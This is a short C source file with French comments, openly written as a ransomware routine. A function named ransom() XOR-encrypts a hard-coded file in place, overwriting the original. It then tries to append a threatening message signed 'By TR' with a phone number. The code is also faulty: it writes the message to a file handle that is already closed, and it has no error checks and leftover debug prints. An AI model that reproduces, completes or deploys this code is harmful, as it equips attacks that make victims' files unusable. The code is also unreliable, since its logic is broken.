#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char input_filename[] = "file_to_encr.txt";
char output_filename[] = "file_to_encr.txt";

void xor_encrypt(const unsigned char *input, unsigned char *output, size_t size, const char *liste)
{
    size_t key_length = strlen(liste);

    for (size_t i = 0; i < size; i++)
    {
        output[i] = input[i] ^ liste[i % key_length]; // XOR avec la clé (boucle sur la clé si nécessaire)
    }
}

int ransom(char *liste)
{
    // Ouvrir le fichier d'entrée
    FILE *input_file = fopen(input_filename, "rb");
    // Obtenir la taille du fichier
    fseek(input_file, 0, SEEK_END);
    size_t file_size = ftell(input_file);
    rewind(input_file);

    // Lire le contenu du fichier
    unsigned char *buffer = malloc(file_size);
    fread(buffer, 1, file_size, input_file);
    unsigned char *encrypted_buffer = malloc(file_size);
    fclose(input_file);
    xor_encrypt(buffer, encrypted_buffer, file_size, liste);
    FILE *output_file = fopen(output_filename, "wb");
    fwrite(encrypted_buffer, 1, file_size, output_file);
    fprintf(input_file, "\nRendez-vous tous ou ce sera la guerre - By TR - tel : 04.22.52.10.10");
    fclose(output_file);
    printf("1");
    free(buffer);
    printf("2");
    free(encrypted_buffer);
    printf("3");
    return 0;
}